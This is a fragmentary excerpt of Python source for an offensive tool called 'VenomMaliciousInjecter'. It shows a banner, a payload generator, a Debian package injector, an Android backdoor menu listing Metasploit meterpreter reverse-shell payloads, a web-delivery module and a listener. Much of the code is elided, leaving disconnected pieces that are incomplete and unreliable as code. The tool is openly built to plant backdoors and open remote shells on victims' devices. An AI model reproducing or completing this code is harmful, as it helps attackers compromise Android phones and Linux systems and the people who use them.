...
[███████████████            01110000 01110100 01100101
 ...
 /   /  `.__/|  `._.' /  \_          /    /    | `.___,      /     /\__ `.__/| /    | `.___,  \__/
    ...
    """+Style.RESET_ALL
        ...
        b5g = Fore.RED+'>'+Style.RESET_ALL+' Follow Me On Github:'+Fore.GREEN+' @NoOAYe '+Style.RESET_ALL
        b5c = Fore.RED+'>'+Style.RESET_ALL+' Created By :'+Fore.GREEN+' AKB'+Style.RESET_ALL
...
# Python Payload Function
    ...
    def Python_Pay_INFO(self, payload, Host, Port,):
        global Counter
...
+------------++-------------------------++-----------------------+        
            """.format(chost,cport,payload,output))
...
""")
        ...
        SHELL = G+"└──["+R+"VenomMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'Payloads'+G+"]: "
        print("\n")
        #Dist = green+"[~] "+distro+"@"+white
...
###################################################################################
        ...
        try:
            print()
            print(G+"│")
            shell = G+"└──["+R+"VenomMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'DebInjector'+G+"]: "
            Payload = int(input(shell))
...
""")
        ...
        sh = G+"└──["+R+"VenomMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'AndroidBackdoor'+G+"]: "
        Payloads = ['android/meterpreter/reverse_http', \
                    'android/meterpreter/reverse_https', \
                    'android/meterpreter/reverse_tcp', \
                    'android/meterpreter_reverse_http', \
    ...
    def WEB_Delivery(self):
        ...
        sh = G+"└──["+R+"VenomMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'WEBDelivery'+G+"]: "
        print('\n')
        while True:
            try:
                Pay = int(input(sh))
...
########################################################################
        ...
        print()
        print(G+"│")
        sh = G+"└──["+R+"VenomMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'Listener'+G+"]: "
        choice = int(input(sh))
        if choice == 1:
            try:
                if os.path.isfile(RC_PATH) == True:
